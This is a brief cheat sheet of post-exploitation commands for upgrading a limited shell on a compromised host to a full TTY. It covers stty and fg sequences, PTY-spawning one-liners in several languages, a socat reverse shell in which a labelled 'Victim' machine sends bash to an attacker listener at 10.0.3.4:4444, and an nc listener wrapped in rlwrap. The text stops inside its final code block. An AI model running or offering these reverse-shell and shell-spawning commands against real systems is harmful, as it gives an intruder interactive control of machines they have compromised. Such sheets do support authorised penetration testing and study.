### Upgrade Shells Cheat Sheet

Sometimes, you want to access shortcuts, su, nano and autocomplete in a partial tty shell.
```bash
# Press CRTL+Z
# stty raw -echo ; fg
# export TERM=xterm
# Press Enter
# reset

# export TERM=xterm
# Press CRTL+Z
# stty raw -echo;fg
# Press Enter
# Press Enter

# ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw -echo
fg

# for zsh
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### TTY shells
```bash
/bin/sh -i

script /dev/null -c bash

script -q /dev/null

# Python
python -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/sh")'

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/sh";'
perl -e 'exec "/bin/bash";'
perl: exec "/bin/sh";

# Ruby
ruby: exec "/bin/sh"

# Lua
lua: os.execute('/bin/sh')

# Socat
## (Kali/Parrot)
socat file:`tty`,raw,echo=0 tcp-listen:4444  
## (Victim)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  

#or use socat binary to get a fully tty reverse shell
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

### rlwrap
```bash
rlwrap nc localhost 4242
